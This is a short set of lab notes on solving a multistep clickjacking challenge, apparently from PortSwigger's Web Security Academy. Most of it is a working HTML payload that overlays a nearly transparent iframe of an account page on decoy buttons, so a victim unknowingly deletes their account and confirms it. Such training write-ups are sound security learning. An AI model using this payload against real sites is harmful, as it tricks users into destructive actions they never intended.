Multistep clickjacking:

    -This challenge has two elements.
    -First delete account and confrmation page so we need two button to click
    -<style>
	    iframe {
		    position:relative;
		    width:1000;
		    height: 700;
		    opacity: 0.0001;
		    z-index: 2;
	    }
        .firstClick, .secondClick {
		    position:absolute;
		    top:512;
		    left:62;
		    z-index: 1;
	    }
        .secondClick {
		    top:310;
		    left:220;
	    }
    </style>
    <div class="firstClick">Click me first</div>
    <div class="secondClick">Click me next</div>
    <iframe src="https://0a3e00770324a63f83dfb5b4000300c3.web-security-academy.net/my-account"></iframe>
    -This is the HTML code to be written for two button click
